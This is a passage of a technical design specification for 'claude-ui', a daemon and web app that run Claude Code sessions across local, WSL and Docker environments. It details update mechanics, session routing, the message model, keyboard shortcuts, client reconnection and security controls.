- Stop: SIGINT, SIGTERM and SIGHUP stop the daemon (WSL sides first) with exit code 128 + the signal number, logged as the exit line. Windows does not end children with their parent: a Windows daemon reads its parent chain once at start (PowerShell `Get-CimInstance Win32_Process`) and exits (code 129, sides stopped) within about 1 s (a hidden PowerShell holds a handle of each and blocks until one ends; no polling) when one of its wrapper ancestors (node.exe, bash.exe, sh.exe, cmd.exe directly above it: npm, its script shell, tsx, the launcher) ends. If the PowerShell watcher cannot start or ends without a result, the daemon logs it and keeps running unwatched. A `cmd.exe` that is still alive above the daemon counts as a wrapper: a daemon started from a `.bat` with `start` stops when that `.bat` ends. Exit codes 129, 130 and 143 do not mark an installed version as failed; other codes (native crash codes included) do. A WSL side exits when its stdin closes (wsl.exe gone).

### Updates

- `claude-ui` (the package bin, `dist/launcher.js`) is a launcher: it runs the newest daemon (`dist/cli.js`) of its own package and of the versions dir `<config dir>/versions/<version>` as a child in the same terminal, with the same arguments and `CLAUDE_UI_LAUNCHER=1`. Child exit 75: start the newest again; any other exit ends the launcher with that code (killed by a signal: 128 + its number, e.g. 143 for SIGTERM); SIGINT, SIGTERM and SIGHUP go to the child, which then ends the launcher (exit 75 included).
- Failed start: a daemon from the versions dir that exits with a code other than 0, 75, 129, 130 or 143 (ended by a signal or by its parent ending) within 10 s of its start gets a `failed-start` file in its folder and the next newest runs instead; a marked version is not picked again (a newer version or a reinstall of it is). When the next one fails within 10 s too, the cause is not the version (port in use, a bad flag): the marks of this launcher run are removed and the launcher exits with the code.
- Check: a daemon started by the launcher, with a release version (not "dev": a source checkout never checks), asks `https://registry.npmjs.org/claude-code-ui/latest` at start and every 24 h. `CLAUDE_UI_UPDATE_REGISTRY` overrides the registry for check and install: https only (plain http only for 127.0.0.1, localhost, [::1]), letters, digits and `. : @ / - _ [ ]` only (it reaches npm's command line, on Windows a shell); anything else stops the daemon at start. Only a plain `X.Y.Z` `version` newer than the running one counts; a failure, a pre-release or any other answer is ignored. Nothing else is sent (ADR 0003). Off with `--no-update-check` / `CLAUDE_UI_UPDATE_CHECK=0`.
- Install (`update.install`, or `claude-ui update` in a terminal): `npm install --prefix <versions>/<v>.partial --omit=dev --no-save … --registry <the check's registry> claude-code-ui@<v>` (always the registry the check asked, not the one of the npm config), the installed `package.json` must have exactly `<v>` and `dist/cli.js`, then the folder is renamed to `<v>`: a cut install is never started. No global install, no sudo, works for `npx` and global installs; the running daemon's files are not touched (Windows file locks). On any failure (npm, version, rename) the `.partial` folder is removed and the error says why (npm: its last 3 lines).
- Restart (`update.restart`): waits until no session has a running turn (also one the CLI starts by itself on a task notification), a running bash mode command, pending input or a running background task of its own query (subagent run or background shell: `task_started` without its `task_notification`; polled every second), stays idle for 5 s (busy again: wait again), then exits 75. Nothing busy but open terminals: `waiting` with `waitingFor` 0 (the notice says the terminals close, its count follows the terminals) until the last terminal is closed or `now: true`; a session busy meanwhile turns it into the session wait. `now: true` exits at once. A restart ends running turns, drops pending requests, closes terminals; sessions restore from transcripts (ADR 0001), browsers reconnect. Side sessions are not counted (ceiling). After a launched daemon listens it removes the version folders older than the newest one older than itself; newer versions, `.partial` installs and other names stay.
- Web app: a persistent toast (OpenCode's "Update available"): "claude-ui <v> is available (you have <current>)" [Update and restart] [Not yet]; "Installing claude-ui <v>…"; "Update installed: Restarts when N sessions are idle[ and closes M open terminals]. Restart now ends N running sessions." or, only terminals open, "Restarting closes M open terminals." [Restart now]; "Restarting claude-ui <v>…" until the reconnect, whose daemon sends no update. A failed install shows the error [Try again] [Not yet]. "Not yet" hides that version in this browser (localStorage `claude-ui.update.dismissed`) until a newer one; a phase under way shows anyway.

- Stale daemon (`build-info.ts`): a daemon whose code is older than what is on disk can lack tools and permission modes the source has (a coordinator then sees a schema without `auto`). A source checkout ("dev") is stale when a non-test `.ts` file under `packages/daemon/src` or `packages/protocol/src` has an mtime after the process start; a release is stale when a newer complete install (no `failed-start`) is in the versions dir. Checked at most every 10 s. The note goes to the coordinator as `daemonNote` in `worker_start` and `worker_list` (the tool descriptions say to tell the user) and to each new web connection as `daemon_stale {note}`; the web app shows a persistent toast "The daemon runs older code" with the note [Dismiss] (hidden until the page reloads; not shown while the update toast shows). A restarted daemon sends none.

### Sides (WSL distros and Docker containers)

- A side is one Claude Code install the daemon (hub) reaches: its own (`local`, label `Windows`, `Linux` or `macOS`), a WSL distro (`wsl:<distro>`, `WSL: <distro>`; Windows only: `wsl.exe -l -q`, Docker and Rancher Desktop distros left out) or a running Linux Docker container (`docker:<name>`, `Docker: <name>`; any OS with the `docker` CLI on PATH at daemon start). Containers: `docker version --format {{.Server.Os}}` must say `linux`, then `docker ps --filter status=running --format {{.Names}}` (first name of each; Kubernetes `k8s_*` left out); 10 s timeout each; no CLI, no engine or Windows containers: no Docker sides, no error. They are listed at daemon start and again on a `session.list` at most every 5 s (the web app lists when Open project opens). A new container joins and a gone one leaves (`sessions.changed`), unless it is starting, ready or failed (an error stays with its message). A daemon with WSL distros or the docker CLI has sides: `session.list` then carries `sides` (state off, starting, ready, error + message) and `cwdSides` (the side of each listed cwd that is not local).
- A side is the same claude-ui run inside the distro or container with `--side`: no HTTP, the wire protocol over its stdio as JSON lines. hub -> side: `{c, o}` opens virtual connection c (the daemon's connection handler serves it like a WebSocket), `{c, m}` a client message, `{c, x}` closes it. side -> hub: `{ready}`, `{c, m}` a server message, `{push}` a Web Push payload the hub sends. Other stdout lines (shell start-up) are ignored; side logs go to stderr.
- WSL `side.start`: `wsl.exe -d <distro> --exec bash -lic` sources a base64-encoded script (login + interactive shell: nvm, PATH): checks Node 22+ and a login (`$CLAUDE_CONFIG_DIR` or `~/.claude/.credentials.json`, `ANTHROPIC_API_KEY` or `CLAUDE_CODE_OAUTH_TOKEN`), that make, python3 and g++ exist (node-pty builds from source on Linux: `build_tools_missing`), `npm install --install-links` of the hub's own package folder (installed package root, or `packages/claude-ui` of a source checkout, which `npm start` builds; `wslpath` gives its `/mnt` path; npm packs it and installs Linux dependencies) into `~/.local/share/claude-ui/side/<version>-<dist/cli.js mtime>`, removes the other installs there with a POSIX loop, then runs it. A failed check prints `CLAUDE_UI_SETUP <code>`; the reply `side_failed` carries the user's next step.
- Docker `side.start`: `docker inspect -f {{.State.Running}}` (not running: "Start it (docker start <name>), then retry"; gone: "no longer exists"). The hub packs its own package folder once per key `<version>-<dist/cli.js mtime>` (`npm pack --ignore-scripts` into `<config dir>/side-pack/<key>`, other keys removed; no build: run npm start). `docker cp` puts the tarball at `/tmp/claude-ui-side-<key>.tgz`, then `docker exec -i <name> sh -c <script>`: plain `sh` with the image's environment, not a login shell (a login profile resets the image's PATH); nvm is sourced when present. Same checks as WSL; `npm install` of the tarball into `~/.local/share/claude-ui/side/<key>` when not installed; the tarball is removed. Roots: the container's `CLAUDE_UI_ROOTS`, else home plus the exec working dir (the image's WORKDIR) when that is outside home and not `/`. Setup errors give the container's next step.
- A started side is kept in `sides.json` and starts with the next daemon start (a Docker side once its container is listed running, once per daemon run). It exits with the hub (stdin closed). A side process that ends (the container stopped) puts the side in `error`: "<label> stopped (exit code N). Retry to start it again."
- Routing, per browser connection, one virtual connection per ready side: an explicit `side` field; else a session ID's side (learned from lists, create replies, events; an unknown ID that is not a local session is looked up on each side with a background `session.subscribe`, which holds no CLI); else a terminal ID's side; else the path (`cwd`, `path`): a Windows path is local, a POSIX path belongs to the side of the longest known cwd containing it (on a Linux or macOS hub the local list's cwds count too, so a host project under a container's cwd stays local), else the only ready side (a POSIX hub: local). `session.list` merges every side's list (newest activity first); `permission.respond`/`question.respond` go to every side (the one that has the request settles it); `push.focus` to every side; `fs.watch` splits its paths by side. Plan usage is the local account's (side plan_usage is dropped). Ceiling: the same POSIX path in two sides routes to the side learned last; the same path on the host and in a container (a bind mount at the same path) routes local on a POSIX hub (a side cannot take a local cwd over); a request with `side` is exact.
- Settings and orchestration: the hub sends its Settings to every side (`settings.set` with the full settings when a browser connection attaches the side, and after each `settings.set`), so a coordinator on a side runs with the same orchestration settings and starts workers on its own side. `settings.set` always goes to the hub, even when it carries `side`. `worker_start` with a cwd of another side is a tool error naming that side (ceiling: no cross-side workers).
- Web app: Open project (hidden with one side) shows one row of kinds, never one chip per distro or container: the machine itself (`Windows`, `Linux`, `macOS`), `WSL` and `Docker`, each only when it has members (arrows move the focus, Enter or Space picks). `WSL` and `Docker` add a dropdown (distro or container name; a state word `Not set up`, `Setting up…` or `Error` for a side that is not ready) that switches within the kind. `WSL` opens the last used distro, else the first ready one, else the first listed. `Docker` first shows the running containers as a list with a name filter (ready ones first; Enter or a click picks the highlighted one, even when there is only one) and sets nothing up until one is picked; the last used container opens directly, and one that is no longer listed asks again. The last side and, per kind, the last distro and container are remembered (`localStorage`). A side not running starts when chosen ("Setting up …", or the error + Retry); a remembered side starts when the dialog opens, a container never does unless it was picked before. A typed path switches side only on a Windows hub (`C:\` Windows, `/` a WSL side (else Docker), `\\wsl$\<distro>\` / `\\wsl.localhost\<distro>\` that distro); there is no Docker path syntax: a POSIX path goes to the chosen side. The `/mnt/<drive>` hint shows on WSL sides only. Projects and sessions show a side badge (sidebar short form `Win`/`Linux`/`macOS`, `WSL` or the distro name with several distros, `Docker` or the container name with several containers); `fs.upload` carries the session cwd so the file lands on its side. `fs.media` of a side path: `side_unsupported` ("Preview is not available for files in WSL" / "in Docker").

## Message model

The daemon converts raw SDK messages into one normalized model; the UI renders only this model.

| Part type | Key fields | Rendered as |
| --- | --- | --- |
| `user_text` | `id`, `text`, `images[]` | User bubble: markdown, rendered as assistant text (typed HTML stays text, a single newline is a line break, the first 1200 characters of fenced code in a message are syntax colored at once; further code renders as plain text and its colors are painted over that text (CSS Custom Highlight API; text, line breaks and a selection in it stay as they are) once the block is on screen and no timeline has been scrolled by the user for 0.5 s (the app's own scrolls, such as following a streaming turn, do not count); only blocks on screen are painted, never the rows mounted just outside it; a block that leaves the screen drops its colors and gets them back from a cache when it returns (also after its row unmounted); tokenized line by line in idle time with no task over ~30 ms, the block nearest the middle of the screen first, a line over 1000 characters stays plain; light and dark theme colors as in assistant code; italic and bold token styles are not shown; browsers without the Highlight API show it plain), with copy (raw text) and rewind actions (shown on hover or focus) |
| `assistant_text` | `id`, `text`, `streaming` | Markdown, streamed at a steady pace; a finished turn (a prompt or bash card follows, or it is the last and nothing runs) ends with a Copy response action: its text blocks as markdown joined by a blank line, no tool calls or reasoning |
| `thinking` | `id`, `text` | Not shown; a "Thinking" row shows while the turn runs |
| `tool_call` | `toolUseId`, `tool`, `input`, `status` (pending / running / done / error / denied / stopped; stopped: a stopped background task or subagent run, or a call whose query ended without its result) | Tool card, by tool type |
| `tool_result` | `toolUseId`, `output`, `isError`, `original?` (file before the first Edit/Write of a path, live only) | Merged into its tool card; `original` feeds the changes tab |
| `bash` | `id` (its `<bash-input>` record uuid), `command`, `stdout`, `stderr`, `status` (running, done, error, stopped), `exitCode?` | Bash card: `$ command` and output, always open; "Running…", "Stopped" or "Exit code N" below |
| `permission_request` | `requestId`, `toolUseId`, `tool`, `input`, `suggestions[]`, `settled`, `decision?`, `at?` (ms the daemon asked), `tier?` (`"low"`, sent as a second event of the part once the tier is read, and sent again without it if a later read says otherwise; absent = high or not read yet; orchestration delivers a request to its coordinator once, whatever the number of events) | Permission panel; in the timeline its tool card is held expanded with status "Awaiting approval" (an Edit/Write card with a diff stays collapsed: the panel shows the diff) |
| `question` | `requestId`, `toolUseId`, `questions[]`, `settled`, `answers?` (absent = cancelled) | Question panel |
| `todo_update` | `items[]` (content, status, activeForm) | Pinned todo list (todo dock: each item by its content, as OpenCode; collapsed state kept per browser) |
| `subagent` | `id`, `description`, `status`, `startedAt`, `endedAt?`; child parts carry `parentId` = `id`; its own `parentId` = the run that started it (none = the session) | Nested, collapsible group with an Open icon; agent map node; subagent view |
| `session_state` | `state`, `working?` (idle with background tasks running) | Header badge, list badge |
| `auto_continue` | `at` (ms, or null) | Not rendered in the timeline; while set the prompt box shows "Continuing at ..." with Cancel (see "Continue after a usage limit") |
| `commands` | `commands[]` (name, description, argumentHint, aliases?) | Slash command picker; not in the timeline |
| `context_usage` | `usage` (`totalTokens`, `maxTokens`, `percentage`, `categories[]` name + tokens + SDK `kind` used/free/buffer, deferred left out) | Context meter in the prompt box toolbar, breakdown popover; not in the timeline |
| `turn_result` | `durationMs`, `costUsd` (this turn; the SDK total is cumulative, absent for the first turn after a daemon restart), `usage`, `isError` | Turn footer (live turns only) |
| `turn_interrupted` | — | Status line; replaces the turn footer |
| `notice` | `level` (notice / warning), `text` | Claude Code banner from `system/informational` (level `info` not shown, `notice` gray, `suggestion` / `warning` as warning) and `system/model_refusal_fallback` / `model_refusal_no_fallback` (warning): one 11px line, a run of blank lines shown as one, a warning icon and the warning colour for warnings. Notices with a `tool_use_id` (progress of one tool call) share one line, the latest text. `system/per_turn_effort_changed` is not shown |
| `raw` | original message | One muted line: `type/subtype` of an SDK message the adapter does not know, or the error of a failed query; never its JSON |
| `compaction` | `trigger?`, `summary?` | Divider "Conversation compacted" (OpenCode); the summary collapsed below it. Live from `system/compact_boundary`, filled by the synthetic summary message after it; a restored transcript starts at its `isCompactSummary` message |
| `rewind` | `userMessageId` | Not rendered; the client drops that user message and every part after it |
| `retract` | `partIds` | Not rendered; the client drops those parts. From `system/model_refusal_fallback` `retracted_message_uuids` (live): the parts of the refused partial answer (assistant blocks, tool results) |
| `session_cleared` | `sessionId` | Not rendered; a tab that shows the session live switches to `sessionId`, the session the CLI goes on in after `/clear`, in its place and keeping its prompt box (see "Sessions") |
| `external_turn` | `running` | Not rendered in the timeline; while true the prompt box shows "A terminal CLI turn is running in this session" and sends nothing (see "Terminal CLI and web app on one session") |

**Adapter rules**

- Streaming deltas accumulate under a stable part `id`; the UI replaces rather than appends.
- A `tool_result` updates its `tool_call` status; grouped by `toolUseId`.
- Tool rendering keyed on `tool`: `Bash`, `Edit`/`Write` (diff), `Read`, `Grep`/`Glob`, `TodoWrite`, `Task` (subagent), `Artifact` / `ArtifactComments` / `ArtifactData`, anything else (JSON). The Artifact cards show the title (or file name, never the scratchpad path) of a publish, or `<Action> <target>`, as the row summary; the body shows description, file path and the claude.ai artifact link (`https://claude.ai/(code/)?artifact/<id>` only, new tab, `rel="noopener noreferrer"`; any other URL, also one with a trailing slash, query or fragment, is plain text), the result as plain text lines (viewer-written comment and reply text is never markdown), and for `ArtifactData` the written `data` / `writes` and the result as JSON. There is no embedded preview and no artifact browser (GH-175, GH-176). The result text format of these tools is not parsed beyond the first claude.ai URL.
- The daemon enables TodoWrite (`CLAUDE_CODE_ENABLE_TODO_TOOLS=1`, `CLAUDE_CODE_ENABLE_TASKS=0`; off by default on current models), the Artifact tools and skills (`CLAUDE_CODE_ARTIFACT=1`; off by default in SDK sessions) and `forwardSubagentText`.
- A background subagent ends with `task_notification`, not with its placeholder `tool_result`; `stopped` (a transcript's `killed`) ends it as `stopped` (the error `tool_result` after a stop keeps it so), `failed` as `error`. When the live query ends (CLI exited), its runs and calls still running end `stopped` and the stop map is cleared. A restored one ends with the transcript's `<task-notification>` user text; a later notice of a run that resumed (task ID only) moves its `endedAt`. `SendMessage` to an ended run resumes it (SDK 0.3.285: a new `task_started` with the same `task_id` and the `SendMessage` call as `tool_use_id`; the run's messages keep the Agent call as `parent_tool_use_id`; its `task_notification` names the `SendMessage` call; the `tool_result` names `resumedAgentId`, also in a transcript): the subagent part goes back to `running` without `endedAt` (live at `task_started`, restored at the `tool_result`) and ends at that notification. The `SendMessage` card ends at its `tool_result`. A message to a running run is queued (no task messages).
- A subagent run's `startedAt` / `endedAt` (ms) are the transcript timestamps of its Agent call and of the message that ends it, live the daemon clock; the first part of a call fixes `startedAt`. Nested runs (spawn depth up to 3, SDK default) nest by the same `parentId` rule.
- The same adapter converts live SDK messages and `getSessionMessages()` history.
- Fixture tests recorded from real SDK sessions.

### Keyboard shortcuts

Browsers keep Ctrl/Cmd+T, +W, +N, +Tab, +Shift+T, +1..9 and Ctrl+PageUp/PageDown; a page never receives them (the list is `RESERVED` in `keymap.ts`). So the same gestures sit on keys the page gets. Every default has Ctrl, Cmd or Alt (a plain key would fire while typing), so it works in the prompt box. `mod` = Ctrl, Cmd on macOS. The registry is `SHORTCUTS` in `shortcuts.ts`; its ids are the palette command ids; each is a palette row with its keybind chips (the current binding).

| Command | Default (Windows/Linux) | macOS |
|---|---|---|
| Command palette | Ctrl+K, Ctrl+Shift+P | Cmd |
| Open file / Open settings / Keyboard shortcuts | Ctrl+P / Ctrl+, / Ctrl+/ | Cmd |
| New session | Ctrl+Shift+S | Cmd |
| Previous / next tab, close tab | Ctrl+Alt+Left / Right / W | Cmd+Alt |
| Go to tab 1..8, last tab | Alt+1..8, Alt+9 | Ctrl+1..9 |
| Reopen closed tab | Alt+Shift+T | Ctrl+Shift+T |
| Toggle sidebar / side panel / file tree | Ctrl+B / Ctrl+Shift+R / Ctrl+\ | Cmd |
| Show files / changes / git graph | Ctrl+Shift+E / G / H | Cmd |
| Toggle terminal / new terminal | Ctrl+` / Ctrl+Shift+` | Ctrl |
| Focus prompt, change model | Ctrl+L, Ctrl+' | Ctrl+L, Cmd+' |
| Go to notifications | Ctrl+Alt+N | Cmd+Alt |
| Prefix key | Alt+A | Option+A |

- Tab N counts tabs in `tabs` order (the order Next tab uses, "New session" tab included); a number without a tab does nothing. Digits and ` match by physical key (`event.code`) with any modifier, and only the spec of that key matches (one press never fires two bindings), because Alt+1 and macOS Ctrl+1 type "+" on a Czech layout, Ctrl+1 types "&" and Ctrl+` "²" on AZERTY, and Option+A types "å" on macOS; a number pad digit matches its digit spec by the typed digit (NumLock off, "End", matches no digit). Off macOS, Ctrl+Alt is AltGr: a press that types a character with it (German AltGr+Q "@", AltGr+7 "{", Polish AltGr+A "ą", Spanish and Italian AltGr+the key right of P "[", an AltGr dead key) never runs a shortcut; Ctrl+Alt counts as a shortcut only on an ASCII letter, a digit, a named key, Space or a number pad operator, and any other character with Ctrl+Alt counts as AltGr (AZERTY Ctrl+Alt+&, Russian Ctrl+Alt+Л and US Ctrl+Alt+/ too, since a base character cannot be told from an AltGr one). Off macOS, Alt with a number pad digit is a Windows Alt code (Alt+0169 types "©"): no shortcut fires and the recorder refuses it ("Alt with a number pad digit types a character code ..."); Alt+1 on the digit row still goes to tab 1. On macOS, Option (+Shift) without Cmd or Ctrl on a printing key types a character (Option+L "@" on a German layout): the recorder refuses it ("On macOS Option types “@” with this key ... Add Cmd or Ctrl."), and a stored one is dropped on load; Option with a named key (F2) is fine. The default prefix key Option+A is the one exception: it is a default, not a binding, and Reset restores it. A letter matches by the typed key (so the recorder stores the typed letter on QWERTZ, AZERTY and Dvorak), on macOS with Option by the physical key. Go to tab N rows are palette rows for a typed search only.
- Reopen closed tab: a stack of the last 10 closed session tabs with their position, per browser (`localStorage["claude-ui.closed-tabs"]`); sessions deleted since, or open again, are skipped; the tab returns to its place. Not offered (no palette row, the key does nothing) while the stack has no usable entry.
- Show files / changes / git graph open the side panel (narrow screens: switch the pane); pressed again while shown they move the focus to the prompt box. Git graph needs a repository. New terminal opens the terminal panel when hidden, else adds a terminal.
- Prefix key (tmux): Alt+A arms for 1.5 s and shows a hint (`role=status`) with the second keys; the next plain key runs its command: `c` new session, `n` / `p` next / previous tab, `1`-`9` tab N (`9` last), `x` close tab, `t` terminal, `f` files, `g` changes, `s` sidebar, `z` focus prompt, `,` settings, `?` shortcuts, `:` palette. Esc, any other key, or the timeout cancels; the key that ends it is swallowed (capture phase), so it reaches no prompt box or terminal. Ignored while a dialog is open or an IME composes.
- Terminal focus: keys with Alt, the prefix key, Go to tab N, the palette keys, Keyboard shortcuts, Toggle terminal and New terminal leave the terminal for the app; other Ctrl+letter keys stay with the shell.
- Keyboard shortcuts dialog (Ctrl/Cmd+/, palette, prefix `?`, Settings > Keyboard > Customize…; the config dialog shell): groups General, Tabs, Panels, Session, Prefix key, then read-only "In the prompt box" (Bold, Italic, Inline code: `FORMAT_KEYS`) and "Fixed" (Esc, Shift+Tab); a filter by title or key; per row Edit (records the next key press; Esc cancels, Backspace removes the binding), Reset when changed, and a footer "Reset all". After a row's Reset, Replace or Cancel the focus is on the row's Edit button (the filter when the row no longer matches it). A combo without Ctrl, Cmd or Alt is rejected ("Use Ctrl, Cmd or Alt with the key, or it would fire while typing"), an AltGr press too ("Ctrl+Alt is AltGr on this keyboard and types “@” with this key, so the shortcut would block typing it. Pick another key."), a dead key too ("This is a dead key: it starts an accented letter. Pick another key."; on digits, ` and macOS Option+letter the physical key is recorded, so a dead key there is fine), a browser-reserved one too ("The browser keeps this shortcut"), a key the prompt box uses for editing too ("The prompt box uses this key (Paste). Pick another key."; Ctrl/Cmd+A, C, V, Shift+V, X, Z, Shift+Z, Ctrl+Y, Ctrl+Backspace/Delete, Ctrl+Arrow and Ctrl+Home/End, on macOS Cmd+Backspace/Arrow and Option+Backspace/Delete/Arrow, each with or without Shift; `EDITING_*` in `keymap.ts`), a combo used by another shortcut asks "Already used by <title>" with Replace (the other loses its binding) or Cancel; a prompt box format key cannot be taken (Mod+B stays shared by design); the conflict check also reports any other binding that fires on the recorded press, not only the same spec string. Bindings persist per browser: `localStorage["claude-ui.keybindings"]` = `{id: spec | null}` (`null` = no binding); unknown ids and invalid specs (including ones a newer rule refuses: AltGr, macOS Option, editing keys) are dropped on load and the row falls back to its default. The app key handler ignores IME composition. Button tooltips (terminal, side panel) show the current binding.

### First-use guide

### Client state

- One WebSocket per tab, auto-reconnect with backoff (500 ms doubling to 10 s); resubscribe with last `seq` and `logEpoch`. Never two sockets at once: a late event of a replaced socket is ignored. Wake: on `visibilitychange` to visible, `pageshow` and `online` the page redials at once (backoff reset, no double dial; nothing when unauthorized). A socket still open after the page was hidden for 10 s or more (or on `online` or a restored back/forward-cache page) is probed with the `ping` request; no reply within 1 s means a zombie socket: it is abandoned, the status goes to reconnecting and the page dials again at once (the subscriptions resume with `sinceSeq`).
- Per-session store keyed by part id; events applied idempotently. It holds the loaded pages plus `aux` (the not loaded region's subagent runs, turn results, running background shells, and on demand its Edit/Write calls for the changes tab), so the agent map, token totals, background shells and changes count cover the whole session. A snapshot subscribe replaces the view; a rewind of a message the view does not hold takes a fresh snapshot.
- Connection status in the header.
- Service worker for Web Push (no `fetch` handler: no offline cache); notification icon `icon-192.png`, badge `badge-96.png` (monochrome). PWA manifest: `id` and `scope` `/`, `display: "standalone"`, SVG icon plus PNG icons of 192 and 512 (purpose `any`) and maskable ones (full-bleed, glyph inside the safe zone); `apple-touch-icon.png` (180, opaque) and the iOS standalone meta tags in the page head. Installing needs a secure context (HTTPS or localhost), so `--lan` cannot install; the daemon says so at start. The icons are rendered by the dev-only `packages/web/scripts/icons.mjs`.
- Prompt drafts: the unsent text of a prompt box (text only, no images, not bash mode) is kept in this browser's localStorage per session (`claude-ui.draft.<sessionId>`, `claude-ui.draft.new` for the new-session tab), saved 400 ms after the last keystroke, at once when the box is emptied (sent) and when the page goes to the background (`visibilitychange` hidden, `pagehide`), and is the box's initial text after a reload (a rewind draft replaces it). The 30 most recently saved drafts stay. They are cleared when the browser is unpaired (`unauthorized`).
- Pairing field: a browser the daemon rejects (`unauthorized`) shows a form that takes a pairing URL (any origin), `#token=…` or the bare token, checks it with `GET /auth` (204: stored, page reloads; 401 and an unreachable daemon have their own message), so a Home Screen app on iOS (own storage, cannot read Safari's) can be paired.

## Security

The daemon can run arbitrary shell commands; treat it as a remote shell.

- Bind to 127.0.0.1 only, unless `--lan` (`CLAUDE_UI_LAN=1`): 0.0.0.0, plain HTTP, the IPv4 LAN addresses at start join the origin-check hostnames and get a pairing URL each. The token is readable on that network; push and clipboard need HTTPS. The web app needs no secure-context API to work (request ids are a counter).
- Remote access: `--tailscale` (ADR 0004). Preflight: CLI found, BackendState Running, CertDomains set, no Funnel on `<dns>:443` (top level or foreground sessions), no foreground serve on 443, 443 free or already proxying to the port. Then a foreground `tailscale serve --https=443 http://127.0.0.1:<port>` child, killed on exit. `Self.DNSName` joins the origin-check hostnames. No external hosting (ADR 0003).
- Static files (packages/daemon/src/static.ts): `GET` and `HEAD` only. `/assets/*` (content-hashed) `Cache-Control: public, max-age=31536000, immutable`; every other file (`index.html`, `sw.js`, manifest, icons) `no-cache`. A weak `ETag` (size and mtime of the served variant) and `Last-Modified`; a matching `If-None-Match` gets 304. The web build writes `.br` (quality 11) next to js, css, html, svg, json, webmanifest, txt and wasm files of 1 KB or more that shrink by 10 % or more (the npm package ships no `.gz`). The daemon serves `.br` to a client that accepts it (`q=0` respected); else, for a client that accepts gzip (Chrome sends br only over HTTPS or localhost, so plain-http `--lan` phones get gzip), it compresses the file once on request (level 9, files of 1 KB or more) and keeps the bytes in memory per file version; else the file. Responses carry `Content-Encoding` and `Vary: Accept-Encoding`, and the gzip variant has its own ETag; a request for a `.br` or `.gz` path is a 404. A missing path under `/assets/` or with a file extension is a 404 (`no-store`), never index.html; other missing paths (client routes) serve index.html. A page of an older build asks for lazy chunks that are gone: on `vite:preloadError` it reloads once per failing chunk.
- Daemon WebSocket keep-alive: every 15 s the daemon pings each browser socket; a socket with no pong since the previous tick is terminated (its close handler runs: the tab no longer counts as focused for push, subscriptions and watches are released), so a half-open socket (phone asleep, Wi-Fi gone) is dropped within 15-30 s.
- Token auth on every WebSocket connection; pairing by a printed URL or QR code containing the token. A browser cannot read the status of a rejected upgrade, so after a failed dial the web app asks `GET /auth` (`Authorization: Bearer <token>`, 204 or 401); on 401 it stops redialing and tells the user to open the pairing URL.
- `GET /media/<nonce>/<name>` serves a file chosen by `fs.media`: nonce 128-bit, bound to the canonical path and the issuing connection, dropped when it closes, 10 min idle (each use extends); the path is re-checked per request (realpath inside the roots, last component opened no-follow) and `<name>` is ignored; Host must be a known hostname, Origin (when sent) the own origin, Sec-Fetch-Site (when sent) same-origin or none; type from the extension allowlist; headers `nosniff`, CSP `default-src 'none'; img-src 'self'; media-src 'self'; style-src 'unsafe-inline'; sandbox`, `Cache-Control: no-store`, `Cross-Origin-Resource-Policy: same-origin`, `Referrer-Policy: no-referrer`, SVG as `attachment`; one Range (206/416); no size limit (streamed). The pairing token is never in a URL.
- Origin check on WebSocket upgrade.
- Working directory allowlist for sessions, file tree, editor writes, session list, content search, terminals and the commit graph (the repository top must be inside the roots) (a project's git worktree outside the roots is only named in `session.list` `worktrees`, marked `outsideRoots`: no sessions listed or created there) (a terminal is a remote shell: only over the authenticated, origin-checked WebSocket, cwd inside the roots). The shell gets the user's environment like a VS Code terminal (an `ANTHROPIC_API_KEY` or credentials file the user has are visible to it) minus the daemon's own settings (`PORT`, `CLAUDE_UI_*`). WebSocket frames above 64 MiB close the socket (ws `maxPayload`).
- Worktree create and remove (see "Worktrees"): only inside the repository's `.claude/worktrees` (a `.claude` or `.claude/worktrees` that is a link is refused), only inside the roots, and remove only for worktrees created there (`worktree-*` branches only deleted); the user's own worktrees elsewhere are never removable from the web app.
- Default permission mode asks; bypass modes off unless enabled in daemon config (`CLAUDE_UI_ALLOW_BYPASS=1`).
- Credentials: the owner's subscription login stays in the daemon's environment, never sent to the browser.
- No secrets in logs.
- Bash mode (`session.bash`): same authenticated WebSocket as `terminal.create` (token, origin check), no new endpoint. Runs only in the session cwd, re-checked against the allowlisted roots (`cwd_not_allowed`). The permission system is not consulted: it is the user's own typed command, Claude Code's own `!` also skips it, and the same connection can already open any shell in the terminal panel, so it adds no capability. Env as terminals (user env without `PORT` and `CLAUDE_UI_*`). Limits: one command per session, idle only, stdout and stderr each capped at 30 000 characters (the rest is dropped with a marker), 10 min timeout, stdin closed, Stop/Esc/close kills the process group. The command and output are never logged. The command ends when its shell exits (output still arriving 500 ms after that is dropped, so a `setsid` background process cannot hold the session); a background process of the command (`sleep &`) is not killed at the end, as in the CLI's bash mode. A killed or timed-out command gets exit code 128 + signal and a last stderr line "Stopped by user" / "Timed out after N s", so Claude sees the output is partial, and restores as Stopped. A daemon crash leaves a running command orphaned (like terminals).

## Scope and build

Work is split into GitHub issues along a dependency graph, so independent pieces run in parallel worktrees (Orca).

**Core (first)**: shared package → daemon session + streaming + adapter + seq/replay → web app session view with generic tool cards → permission bridge and panel → interrupt, steering, multiple sessions, session list, directory picker → tool-specific cards → auth token, origin check, allowlist.

**Then, in parallel where possible**: model switch; commands and skills; @-mentions; images; questions; edit-before-accept; file tree and editor with send-selection; checkpoints and rewind; push notifications (needs HTTPS).

**v1 is done when**: a session keeps running with the tab closed, the phone reconnects and shows every message once, a permission request can be answered from either of two open tabs, and the phone gets a push when a session needs input.

**Deferred**: multi-user.
